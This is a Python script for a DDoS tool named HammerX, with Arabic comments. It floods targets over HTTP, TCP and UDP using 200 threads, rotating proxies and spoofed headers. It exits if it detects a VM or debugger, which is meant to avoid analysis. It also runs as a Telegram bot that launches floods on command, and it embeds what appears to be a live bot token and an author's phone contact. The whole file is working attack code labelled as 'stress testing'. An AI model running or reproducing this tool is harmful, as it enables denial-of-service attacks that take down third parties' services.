import argparse
import random
import socket
import threading
import time
import os
import sys
import platform
import requests
import json
from queue import Queue
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# === توكن البوت المضمن مباشرة ===
BOT_TOKEN = "8980281589:AAEqY4nk6POnwVwNJ85tZ4GKhh8j7fGbUgw"

console = Console()
proxies = Queue()
stats = {"sent": 0, "failed": 0}
stop_event = threading.Event()

BANNER = r'''
██╗░░██╗░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░██╗░░██╗
██║░░██║██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗╚██╗██╔╝
███████║███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝░╚███╔╝░
██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗░██╔██╗░
██║░░██║██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║██╔╝╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
HammerX - Advanced DDoS Stress Testing Tool
Author: KiNG_CYReX
Contact: Telegram/WhatsApp +989903390280
'''

def is_virtual_machine():
    indicators = ["vbox", "vmware", "qemu", "virtual", "hyperv"]
    sysinfo = platform.platform().lower() + platform.node().lower()
    return any(indicator in sysinfo for indicator in indicators)

def is_debugged():
    return sys.gettrace() is not None

def is_safe():
    return not is_virtual_machine() and not is_debugged()

def load_proxies():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt") as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        proxies.put(proxy)
        else:
            urls = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
            ]
            for url in urls:
                r = requests.get(url, timeout=3)
                for line in r.text.strip().split('\n'):
                    proxy = line.strip()
                    if proxy:
                        proxies.put(proxy)
        console.log(f"[green]Loaded {proxies.qsize()} proxies")
    except Exception as e:
        console.log(f"[red]Failed to load proxies: {e}")

def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0", "Chrome/107.0", "Safari/537.36", "Opera/9.80"
        ]),
        "Referer": random.choice([
            "https://google.com", "https://bing.com", "https://yahoo.com"
        ]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Encoding": "gzip, deflate, br"
    }

def http_attack(target, duration):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            proxy = proxies.get() if not proxies.empty() else None
            if proxy:
                proxies.put(proxy)
                proxies_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                requests.get(target, headers=random_headers(), proxies=proxies_dict, timeout=3)
            else:
                requests.get(target, headers=random_headers(), timeout=3)
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def tcp_attack(ip, port, duration):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            # إرسال بيانات ضخمة وحقيقية للضغط الفعلي
            s.send(os.urandom(4096))
            s.close()
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def udp_attack(ip, port, duration):
    end = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # حزمة بيانات ضخمة حقيقية (حوالي 4 كيلوبايت لكل حزمة لإحداث تأثير حقيقي على النطاق الترددي)
    payload = os.urandom(4096)
    while time.time() < end and not stop_event.is_set():
        try:
            s.sendto(payload, (ip, port))
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def reporter():
    with Progress(SpinnerColumn(), "[bold green]Running...", TimeElapsedColumn()) as progress:
        task = progress.add_task("ddos", total=None)
        while not stop_event.is_set():
            time.sleep(1)
        progress.stop()

def summary():
    table = Table(title="Attack Summary")
    table.add_column("Packets Sent", justify="right")
    table.add_column("Failed", justify="right")
    table.add_row(str(stats["sent"]), str(stats["failed"]))
    console.print(table)
    with open("attack_results.json", "w") as f:
        json.dump(stats, f, indent=2)

# --- دوال بوت تيليجرام التفاعلي ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🤖 أهلاً بك في بوت HammerX المحدث\n\n"
        "طريقة استخدام الأوامر:\n"
        "🔹 اختبار TCP:\n`/attack tcp <IP> <PORT> <DURATION>`\n"
        "🔹 اختبار UDP:\n`/attack udp <IP> <PORT> <DURATION>`\n"
        "🔹 اختبار HTTP:\n`/attack http <URL> <DURATION>`"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats, stop_event
    args = context.args
    
    if len(args) < 3:
        await update.message.reply_text("❌ خطأ في الصيغة! مثال:\n`/attack tcp 127.0.0.1 32000 15`", parse_mode="Markdown")
        return

    mode = args[0].lower()
    target = args[1]
    
    try:
        if mode == "http":
            port = 80
            duration = int(args[2])
        else:
            port = int(args[2])
            duration = int(args[3]) if len(args) > 3 else 15
    except ValueError:
        await update.message.reply_text("❌ البورت والوقت يجب أن يكونا أرقاماً صحيحة!")
        return

    stats = {"sent": 0, "failed": 0}
    stop_event.clear()

    await update.message.reply_text(f"🚀 جاري بدء الاختبار الحقيقي والمكثف ({mode.upper()}) على الهدف `{target}` لمدة `{duration}` ثانية...", parse_mode="Markdown")

    load_proxies()

    attack_func = {
        "http": lambda: http_attack(target, duration),
        "tcp": lambda: tcp_attack(target, port, duration),
        "udp": lambda: udp_attack(target, port, duration)
    }.get(mode)

    if not attack_func:
        await update.message.reply_text("❌ وضع الهجوم غير صحيح! اختر (tcp, udp, http).")
        return

    # زيادة عدد الخيوط (Threads) إلى 200 لضمان قوة التدفق والضغط الحقيقي
    threads = []
    for _ in range(200):
        t = threading.Thread(target=attack_func)
        t.start()
        threads.append(t)

    time.sleep(duration)
    stop_event.set()

    for t in threads:
        t.join()

    summary()

    result_msg = (
        f"📊 **نتائج الاختبار الحقيقي ({mode.upper()}):**\n"
        f"✅ الحزم الفعالة المرسلة: `{stats['sent']}`\n"
        f"❌ الحزم الفاشلة: `{stats['failed']}`"
    )
    await update.message.reply_text(result_msg, parse_mode="Markdown")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(BANNER)
        if not is_safe():
            console.log("[red]Stealth/Sandbox detected! Exiting...")
            sys.exit(1)
        
        parser = argparse.ArgumentParser()
        parser.add_argument("mode", choices=["http", "tcp", "udp"], help="Attack type")
        parser.add_argument("target", help="Target IP or URL")
        parser.add_argument("--port", type=int, default=80, help="Target port (default=80)")
        parser.add_argument("--time", type=int, default=60, help="Duration in seconds")
        args = parser.parse_args()

        load_proxies()
        reporter_thread = threading.Thread(target=reporter)
        reporter_thread.start()

        attack_func = {
            "http": lambda: http_attack(args.target, args.time),
            "tcp": lambda: tcp_attack(args.target, args.port, args.time),
            "udp": lambda: udp_attack(args.target, args.port, args.time)
        }[args.mode]

        threads = []
        for _ in range(200):
            t = threading.Thread(target=attack_func)
            t.start()
            threads.append(t)

        time.sleep(args.time)
        stop_event.set()
        for t in threads:
            t.join()
        reporter_thread.join()
        summary()
    else:
        print(BANNER)
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("attack", attack_command))
        print("Telegram Bot is running successfully...")
        app.run_polling()
